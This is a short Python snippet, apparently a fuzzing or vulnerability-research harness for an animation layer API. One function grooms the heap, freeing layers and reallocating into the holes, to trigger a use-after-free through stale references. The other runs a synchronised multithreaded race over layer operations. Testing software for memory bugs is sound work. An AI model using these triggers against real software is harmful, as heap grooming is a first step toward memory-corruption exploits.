def generate_uaf_sequence(anim):
    """Generates specific sequence to trigger UAF."""
    layers = []
    # Phase 1: create multiple layers (fill the heap)
    for _ in range(10):
        layer = anim.CreateLayer()
        anim.AddLayer(layer)
        layers.append(layer)

    # Phase 2: remove odd-indexed layers (create holes in the heap)
    removed = []
    for i in range(1, len(layers), 2):
        anim.RemoveLayer(layers[i])
        removed.append(layers[i])

    # Phase 3: create new layers (which occupy the holes)
    new_layers = []
    for _ in range(5):
        new_layer = anim.CreateLayer()
        anim.AddLayer(new_layer)
        new_layers.append(new_layer)

    # Phase 4: use the stale references (removed[])
    # These may point to the new layers
    for stale in removed:
        try:
            anim.RemoveLayer(stale)  # UAF: operates on reallocated memory
        except Exception as e:
            print(f"[UAF] {type(e).__name__}: {e}")

def generate_race_sequence(anim, num_threads=4, ops_per_thread=500):
    """Generates race condition sequence with concurrent threads."""
    import threading
    errors = []
    barrier = threading.Barrier(num_threads)

    def worker(thread_id):
        barrier.wait()  # All start simultaneously
        for i in range(ops_per_thread):
            try:
                if i % 3 == 0:
                    layer = anim.CreateLayer()
                    anim.AddLayer(layer)
                elif i % 3 == 1:
                    anim.InsertLayerAt(i % 10, anim.CreateLayer())
                else:
                    anim.ClearLayers()
            except Exception as e:
                errors.append((thread_id, i, str(e)))

    threads = [threading.Thread(target=worker, args=(t,))
               for t in range(num_threads)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    return errors
